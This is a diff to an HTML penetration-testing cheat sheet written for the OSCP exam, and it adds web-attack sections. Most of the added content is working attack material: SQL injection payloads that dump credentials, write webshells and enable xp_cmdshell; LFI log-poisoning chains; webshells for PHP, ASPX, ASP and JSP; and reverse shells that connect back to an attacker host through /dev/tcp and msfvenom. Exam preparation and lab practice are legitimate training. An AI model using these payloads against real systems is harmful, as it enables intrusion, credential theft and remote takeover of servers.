@@ -94,6 +94,18 @@
     /* FOOTER */
     footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
 
+    /* SIGNAL BOX — new format */
+    .sig-entry { margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+    .sig-entry:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+    .sig-signal { color: var(--muted); display: block; margin-bottom: 4px; }
+    .sig-label { color: var(--yellow); }
+    .sig-cmd { color: var(--green); display: block; padding-left: 1em; }
+    .sig-note { color: var(--dim); font-size: 0.73rem; padding-left: 1em; display: block; font-style: italic; }
+    /* MOVE ON BOX */
+    .moveon { background: #f8514908; border: 1px solid #f8514955; border-left: 3px solid var(--red); border-radius: 6px; padding: 10px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.75; }
+    .moveon-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--red); margin-bottom: 7px; display: block; }
+    .moveon-item { color: var(--muted); display: block; padding-left: 0.5em; }
+    .moveon-item::before { content: "✗ "; color: var(--red); }
     /* COPY JS */
   </style>
   <script>
@@ -148,39 +160,250 @@ curl -s http://&lt;IP&gt;/phpinfo.php
 curl -s http://&lt;IP&gt;/web.config
 curl -s http://&lt;IP&gt;/server-status
 curl -s http://&lt;IP&gt;/elmah.axd       <span class="c"># .NET error log</span></pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> X-Powered-By: PHP/7.2.4 or Server: Apache/2.4.49</span>
+          <span class="sig-cmd">searchsploit php 7.2 <span class="sig-note">-- check for known RCE/LFI CVEs on exact version</span></span>
+          <span class="sig-cmd">searchsploit apache 2.4.49 <span class="sig-note">-- CVE-2021-41773 path traversal/RCE</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> gobuster finds /admin, /upload, /backup, /api</span>
+          <span class="sig-cmd">curl -s http://&lt;IP&gt;/admin/ <span class="sig-note">-- check for login panel</span></span>
+          <span class="sig-cmd">curl -s http://&lt;IP&gt;/backup/ <span class="sig-note">-- look for .zip .tar .sql files</span></span>
+          <span class="sig-cmd">gobuster dir -u http://&lt;IP&gt;/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -x json <span class="sig-note">-- enumerate API endpoints</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> .git/HEAD returns 200 (GIT EXPOSED)</span>
+          <span class="sig-cmd">git-dumper http://&lt;IP&gt;/.git /tmp/gitdump <span class="sig-note">-- dump entire repo</span></span>
+          <span class="sig-cmd">cd /tmp/gitdump && git log --oneline <span class="sig-note">-- read commit history for creds</span></span>
+          <span class="sig-cmd">git diff HEAD~1 <span class="sig-note">-- check what was recently removed</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> vhost found by gobuster (e.g. dev.corp.local)</span>
+          <span class="sig-cmd">echo "&lt;IP&gt; dev.corp.local" | sudo tee -a /etc/hosts <span class="sig-note">-- add to hosts</span></span>
+          <span class="sig-cmd">gobuster dir -u http://dev.corp.local -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html <span class="sig-note">-- re-enumerate the vhost</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">gobuster finished with 0 interesting results and no extensions hit</span>
+        <span class="moveon-item">all discovered paths return 403/404/500 with no useful content</span>
+        <span class="moveon-item">no version info in headers and robots.txt is empty</span>
+        <span class="moveon-item">&gt;20 min on web enum with no attack surface — pivot to other ports</span>
+      </div>
     </section>
 
     <section class="sec" id="sqli">
       <div class="sec-head"><h2>SQL Injection</h2></div>
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">manual detection payloads — try in every input/param</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>' OR '1'='1'--
-' OR 1=1--
-admin'--
-1' ORDER BY 1--     <span class="c"># increment until error = column count</span>
-1' ORDER BY 2--
-1' ORDER BY 3--
-' UNION SELECT NULL--
-' AND SLEEP(5)--         <span class="c"># MySQL blind time-based</span>
-'; WAITFOR DELAY '0:0:5'--  <span class="c"># MSSQL blind time-based</span></pre></div>
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">UNION extraction after finding column count</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre><span class="c"># MySQL:</span>
-' UNION SELECT NULL,user(),database()--
-' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT NULL,username,password FROM users--
-' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
+      <div class="note n-bad">sqlmap is BANNED on the OSCP exam. Everything below must be done manually. sqlmap is kept at the bottom for lab/practice use only.</div>
 
-<span class="c"># MSSQL:</span>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 1 — fingerprint the database</span><div class="cb-tags"><span class="tag t-crit">do first</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Clue 1 — check HTTP response headers (before any injection):</span>
+curl -I http://&lt;IP&gt;/
+<span class="c"># X-Powered-By: ASP.NET       → likely MSSQL</span>
+<span class="c"># X-Powered-By: PHP/x.x       → likely MySQL / PostgreSQL</span>
+<span class="c"># Server: Microsoft-IIS/x.x   → likely MSSQL</span>
+<span class="c"># Server: Apache / nginx       → likely MySQL or PostgreSQL</span>
+
+<span class="c"># Clue 2 — error messages reveal the DB (just send a ' and read the error):</span>
+<span class="c"># "You have an error in your SQL syntax" → MySQL</span>
+<span class="c"># "Unclosed quotation mark"              → MSSQL</span>
+<span class="c"># "ORA-00933"                            → Oracle</span>
+<span class="c"># "ERROR: unterminated quoted string"    → PostgreSQL</span>
+<span class="c"># "SQLite3::"                            → SQLite</span>
+
+<span class="c"># Clue 3 — inject version functions (try each until one returns output):</span>
+' UNION SELECT NULL,@@version,NULL--        <span class="c"># MSSQL / MySQL — @@version works on both</span>
+' UNION SELECT NULL,version(),NULL--        <span class="c"># MySQL / PostgreSQL</span>
+' UNION SELECT NULL,banner,NULL FROM v$version-- <span class="c"># Oracle</span>
+' UNION SELECT NULL,sqlite_version(),NULL-- <span class="c"># SQLite</span>
+
+<span class="c"># Clue 4 — comment syntax differs by DB:</span>
+' OR 1=1--      <span class="c"># MySQL / MSSQL / SQLite (-- comment)</span>
+' OR 1=1#       <span class="c"># MySQL only (# comment)</span>
+' OR 1=1/*      <span class="c"># MySQL / MSSQL</span>
+' OR 1=1--+     <span class="c"># URL-encoded space after -- (MySQL quirk)</span>
+
+<span class="c"># Clue 5 — string concatenation syntax differs:</span>
+' UNION SELECT NULL,'a'||'b',NULL--         <span class="c"># Oracle / PostgreSQL (|| concat)</span>
+' UNION SELECT NULL,concat('a','b'),NULL--  <span class="c"># MySQL</span>
+' UNION SELECT NULL,'a'+'b',NULL--          <span class="c"># MSSQL</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 2 — detect: error-based + boolean</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Try these in every parameter (?id=, ?search=, login fields, headers)</span>
+'                        <span class="c"># syntax error = injectable</span>
+''                       <span class="c"># if first breaks but this doesn't = string context</span>
+' OR '1'='1'--
+' OR 1=1--
+' OR 1=2--               <span class="c"># compare response to 1=1 — different = boolean SQLi</span>
+admin'--                 <span class="c"># auth bypass: comments out password check</span>
+admin'#                  <span class="c"># MySQL comment alternative</span>
+' OR 1=1#
+1 AND 1=1                <span class="c"># numeric context (no quotes)</span>
+1 AND 1=2                <span class="c"># numeric boolean — different response = injectable</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 3 — detect: time-based blind (no visible output)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># MySQL — 5 second delay confirms injection:</span>
+' AND SLEEP(5)--
+1 AND SLEEP(5)--
+'; SELECT SLEEP(5)--
+
+<span class="c"># MSSQL — 5 second delay:</span>
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+
+<span class="c"># PostgreSQL:</span>
+'; SELECT pg_sleep(5)--
+
+<span class="c"># Oracle:</span>
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 4 — find column count (required for UNION)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Method 1 — ORDER BY (increment until error):</span>
+' ORDER BY 1--           <span class="c"># no error</span>
+' ORDER BY 2--           <span class="c"># no error</span>
+' ORDER BY 3--           <span class="c"># ERROR = 3 columns exist (use 2 in UNION)</span>
+
+<span class="c"># Method 2 — UNION NULL (add NULLs until no error):</span>
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--   <span class="c"># no error = 3 columns</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 5 — find string columns (which NULLs accept text)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Replace one NULL at a time with 'a' until it appears in response:</span>
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--    <span class="c"># 'a' appears in page = column 2 is string</span>
+' UNION SELECT NULL,NULL,'a'--</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 6 — extract data (MySQL)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># DB fingerprint:</span>
+' UNION SELECT NULL,version(),database()--
+' UNION SELECT NULL,user(),@@hostname--
+
+<span class="c"># List all tables in current DB:</span>
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+<span class="c"># List columns in a table:</span>
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+<span class="c"># Dump creds:</span>
+' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
+
+<span class="c"># Read files (if FILE privilege):</span>
+' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
+' UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL--
+
+<span class="c"># Write webshell (if FILE privilege + writable web root):</span>
+' UNION SELECT NULL,'&lt;?php system($_GET["cmd"]); ?&gt;',NULL INTO OUTFILE '/var/www/html/shell.php'--</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">step 6 — extract data (MSSQL)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># DB fingerprint:</span>
 ' UNION SELECT NULL,@@version,NULL--
+' UNION SELECT NULL,db_name(),NULL--
+' UNION SELECT NULL,system_user,NULL--
+
+<span class="c"># List databases:</span>
 ' UNION SELECT NULL,name,NULL FROM sys.databases--
-' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--</pre></div>
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">sqlmap — use after manual confirms SQLi</span><button class="cpb" onclick="cp(this)">copy</button></div>
+
+<span class="c"># List tables:</span>
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+
+<span class="c"># Dump creds:</span>
+' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
+
+<span class="c"># Check if sysadmin (1 = yes → enable xp_cmdshell):</span>
+' UNION SELECT NULL,IS_SRVROLEMEMBER('sysadmin'),NULL--
+
+<span class="c"># Enable xp_cmdshell (if sysadmin):</span>
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+'; EXEC xp_cmdshell 'whoami';--</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">blind SQLi — manual boolean extraction (no output)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Confirm DB name length first:</span>
+' AND LENGTH(database())=5--      <span class="c"># true/false response tells you the length</span>
+
+<span class="c"># Extract one character at a time (MySQL):</span>
+' AND SUBSTRING(database(),1,1)='a'--   <span class="c"># is first char 'a'?</span>
+' AND SUBSTRING(database(),1,1)='d'--   <span class="c"># is first char 'd'? (true = different response)</span>
+
+<span class="c"># Extract admin password hash character by character:</span>
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5'--
+
+<span class="c"># Automate with a loop in bash (replace true_string with content present when true):</span>
+for i in $(seq 1 32); do
+  for c in $(echo {0..9} {a..f}); do
+    resp=$(curl -s "http://&lt;IP&gt;/page?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),$i,1)='$c'--")
+    echo "$resp" | grep -q "true_string" &amp;&amp; printf "$c" &amp;&amp; break
+  done
+done; echo</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">login bypass — auth SQLi</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Username field — bypasses password check entirely:</span>
+admin'--
+admin'#
+' OR 1=1--
+' OR '1'='1'--
+') OR ('1'='1'--
+
+<span class="c"># Both fields:</span>
+username: admin'--         password: anything
+username: ' OR 1=1--       password: anything
+
+<span class="c"># If app checks both fields separately:</span>
+username: ' OR 1=1#        password: ' OR 1=1#</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">crack dumped hashes</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>hashcat -m 0    hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># MD5</span>
+hashcat -m 100  hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># SHA1</span>
+hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># SHA256</span>
+hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># bcrypt</span>
+hashcat -m 400  hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># phpass (WordPress)</span>
+hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt   <span class="c"># sha512crypt</span></pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">sqlmap — lab/practice only, BANNED on OSCP exam</span><div class="cb-tags"><span class="tag t-your">lab only</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>sqlmap -u "http://&lt;IP&gt;/page?id=1" --dbs --batch
 sqlmap -u "http://&lt;IP&gt;/page?id=1" -D &lt;db&gt; --tables --batch
 sqlmap -u "http://&lt;IP&gt;/page?id=1" -D &lt;db&gt; -T users --dump --batch
 sqlmap -u "http://&lt;IP&gt;/login" --data="user=admin&amp;pass=test" --dbs --batch
 sqlmap -r request.txt --dbs --batch   <span class="c"># from Burp saved request</span>
 sqlmap -u "http://&lt;IP&gt;/page?id=1" --os-shell --batch  <span class="c"># RCE if DBA privileges</span></pre></div>
+
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Page throws SQL error on ' (syntax error visible)</span>
+          <span class="sig-cmd">' ORDER BY 1-- through ORDER BY N-- <span class="sig-note">-- find column count, then UNION extract</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> 1=1 and 1=2 give different page responses (boolean blind)</span>
+          <span class="sig-cmd">' AND SUBSTRING(database(),1,1)='a'-- <span class="sig-note">-- extract DB name char by char</span></span>
+          <span class="sig-cmd">bash loop above <span class="sig-note">-- automate char extraction for hashes</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> SLEEP(5) delays response (time-based blind)</span>
+          <span class="sig-cmd">' AND SLEEP(IF(SUBSTRING(database(),1,1)='a',5,0))-- <span class="sig-note">-- time-based char extraction</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> UNION dump returns password hashes</span>
+          <span class="sig-cmd">hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt <span class="sig-note">-- identify hash type first with hashid</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> MSSQL + IS_SRVROLEMEMBER returns 1</span>
+          <span class="sig-cmd">'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';-- <span class="sig-note">-- RCE via xp_cmdshell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> MySQL + FILE privilege confirmed</span>
+          <span class="sig-cmd">' UNION SELECT NULL,'&lt;?php system($_GET["cmd"]); ?&gt;',NULL INTO OUTFILE '/var/www/html/shell.php'-- <span class="sig-note">-- write webshell directly</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">all parameters tested with ' 1=1 1=2 SLEEP — zero response difference on any</span>
+        <span class="moveon-item">login form only — try default creds first before spending time on SQLi</span>
+        <span class="moveon-item">blind extraction running in background — continue enum on other vectors in parallel</span>
+      </div>
     </section>
 
     <section class="sec" id="lfi">
@@ -208,6 +431,32 @@ curl "http://&lt;IP&gt;/?page=../../../../var/log/nginx/access.log&amp;cmd=id"
 <span class="c"># Other injection points:</span>
 <span class="c"># /var/log/auth.log   → inject via SSH: ssh '&lt;?php system($_GET["c"]); ?&gt;'@&lt;IP&gt;</span>
 <span class="c"># /proc/self/environ  → inject via User-Agent in HTTP request</span></pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> ?file=../../../../etc/passwd returns file contents</span>
+          <span class="sig-cmd">curl "http://&lt;IP&gt;/?page=../../../../etc/shadow" <span class="sig-note">-- try to grab shadow</span></span>
+          <span class="sig-cmd">curl "http://&lt;IP&gt;/?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d <span class="sig-note">-- read PHP source</span></span>
+          <span class="sig-cmd">curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://&lt;IP&gt;/ && curl "http://&lt;IP&gt;/?page=../../../../var/log/apache2/access.log&cmd=id" <span class="sig-note">-- log poison for RCE</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> LFI confirmed but logs not readable</span>
+          <span class="sig-cmd">curl "http://&lt;IP&gt;/?page=../../../../proc/self/environ" <span class="sig-note">-- try proc/self/environ</span></span>
+          <span class="sig-cmd">ssh '&lt;?php system($_GET["c"]); ?&gt;'@&lt;IP&gt; && curl "http://&lt;IP&gt;/?page=../../../../var/log/auth.log&c=id" <span class="sig-note">-- poison auth.log via SSH</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> base64 filter works on config.php — credentials in source</span>
+          <span class="sig-cmd">grep -i "pass\|user\|db\|host" decoded_config.php <span class="sig-note">-- extract DB creds from source</span></span>
+          <span class="sig-cmd">mysql -u &lt;user&gt; -p'&lt;pass&gt;' -h &lt;IP&gt; <span class="sig-note">-- try DB creds directly</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">traversal payloads all return same page / blank (no inclusion happening)</span>
+        <span class="moveon-item">LFI confirmed but logs are unreadable and php:// wrappers blocked</span>
+        <span class="moveon-item">RFI blocked (allow_url_include = Off confirmed via phpinfo)</span>
+        <span class="moveon-item">spent 15+ min on log poisoning paths — try file upload instead</span>
+      </div>
     </section>
 
     <section class="sec" id="upload">
@@ -222,20 +471,88 @@ shell.php.jpg   shell.jpg.php   shell.jpg.php5
 
 <span class="c"># Null byte (old PHP &lt; 5.3.4):</span>
 <span class="c"># shell.php%00.jpg → server saves as shell.php</span></pre></div>
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">webshell payloads by platform</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre><span class="c"># PHP:</span>
-&lt;?php system($_GET['cmd']); ?&gt;
-&lt;?php passthru($_GET['cmd']); ?&gt;
-&lt;?=`$_GET[0]`?&gt;   <span class="c"># minimal</span>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">PHP — create + trigger + rev shell</span><div class="cb-tags"><span class="tag t-lin">linux</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Create:</span>
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+echo '&lt;?php passthru($_GET["cmd"]); ?&gt;' &gt; shell.php   <span class="c"># alt if system() disabled</span>
 
-<span class="c"># ASP (classic):</span>
-&lt;% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %&gt;
+<span class="c"># Verify RCE:</span>
+curl "http://&lt;IP&gt;/uploads/shell.php?cmd=id"
 
-<span class="c"># ASPX (save as .aspx, upload to IIS):</span>
-&lt;%@ Page Language="C#" %&gt;&lt;% var p=new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}};p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %&gt;
+<span class="c"># Trigger reverse shell (URL-encoded):</span>
+curl "http://&lt;IP&gt;/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/&lt;KALI&gt;/4444+0>%261'"
 
-<span class="c"># JSP (Tomcat):</span>
-&lt;% Runtime rt=Runtime.getRuntime();String[] cmd={"/bin/bash","-c",request.getParameter("cmd")};Process p=rt.exec(cmd);out.println(new java.util.Scanner(p.getInputStream()).useDelimiter("\\A").next()); %&gt;</pre></div>
+<span class="c"># Or use the rev shell PHP file directly:</span>
+echo '&lt;?php exec("/bin/bash -c '\''bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1'\''"); ?&gt;' &gt; revshell.php
+<span class="c"># Upload revshell.php, start listener, then:</span>
+curl "http://&lt;IP&gt;/uploads/revshell.php"</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">ASPX — create + trigger + rev shell</span><div class="cb-tags"><span class="tag t-win">windows</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Create webshell:</span>
+echo '&lt;%@ Page Language="C#" %&gt;&lt;% var p=new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}};p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %&gt;' &gt; shell.aspx
+
+<span class="c"># Verify RCE:</span>
+curl "http://&lt;IP&gt;/uploads/shell.aspx?cmd=whoami"
+
+<span class="c"># Generate rev shell ASPX with msfvenom (scores on OSCP):</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f aspx -o revshell.aspx
+
+<span class="c"># Start listener, upload revshell.aspx, then trigger:</span>
+curl "http://&lt;IP&gt;/uploads/revshell.aspx"</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">ASP — create + trigger + rev shell</span><div class="cb-tags"><span class="tag t-win">windows</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Create webshell:</span>
+echo '&lt;%  Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %&gt;' &gt; shell.asp
+
+<span class="c"># Verify RCE:</span>
+curl "http://&lt;IP&gt;/uploads/shell.asp?cmd=whoami"
+
+<span class="c"># Rev shell via msfvenom:</span>
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f asp -o revshell.asp
+curl "http://&lt;IP&gt;/uploads/revshell.asp"</pre></div>
+
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">JSP — create + trigger + rev shell (Tomcat)</span><div class="cb-tags"><span class="tag t-lin">tomcat</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Create webshell:</span>
+cat &gt; shell.jsp &lt;&lt; 'EOF'
+&lt;%@ page import="java.util.*,java.io.*" %&gt;
+&lt;% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd);
+BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+String line; while((line=br.readLine())!=null){out.println(line);} %&gt;
+EOF
+
+<span class="c"># Verify RCE:</span>
+curl "http://&lt;IP&gt;:8080/uploads/shell.jsp?cmd=id"
+
+<span class="c"># Rev shell JSP via msfvenom:</span>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f raw -o revshell.jsp
+curl "http://&lt;IP&gt;:8080/uploads/revshell.jsp"</pre></div>
+
+      <div class="note n-warn">OSCP requires an interactive shell for scoring — webshells alone don't count. Always follow up with a rev shell.</div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Upload succeeds but .php extension is blocked</span>
+          <span class="sig-cmd">mv shell.php shell.php5 <span class="sig-note">-- try alternate extensions: php5 php3 phtml pHp</span></span>
+          <span class="sig-cmd">mv shell.php shell.php.jpg <span class="sig-note">-- double extension bypass</span></span>
+          <span class="sig-note">-- In Burp: intercept upload, change Content-Type to image/jpeg while keeping .php extension</span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Upload succeeds, file accessible at /uploads/shell.php</span>
+          <span class="sig-cmd">curl "http://&lt;IP&gt;/uploads/shell.php?cmd=id" <span class="sig-note">-- verify RCE</span></span>
+          <span class="sig-cmd">curl "http://&lt;IP&gt;/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/&lt;KALI&gt;/4444+0>%261" <span class="sig-note">-- trigger rev shell</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Upload succeeds but file is not executed (served as text)</span>
+          <span class="sig-note">-- Server not configured to execute from uploads dir. Need LFI to include it, or find exec path.</span>
+          <span class="sig-cmd">curl "http://&lt;IP&gt;/?page=../../../../var/www/html/uploads/shell.php&cmd=id" <span class="sig-note">-- chain with LFI if present</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">all extension variants rejected and Burp Content-Type bypass also fails</span>
+        <span class="moveon-item">file uploads but is never executed (no LFI to chain with)</span>
+        <span class="moveon-item">no upload functionality found after full directory brute force</span>
+      </div>
     </section>
 
     <section class="sec" id="cms">
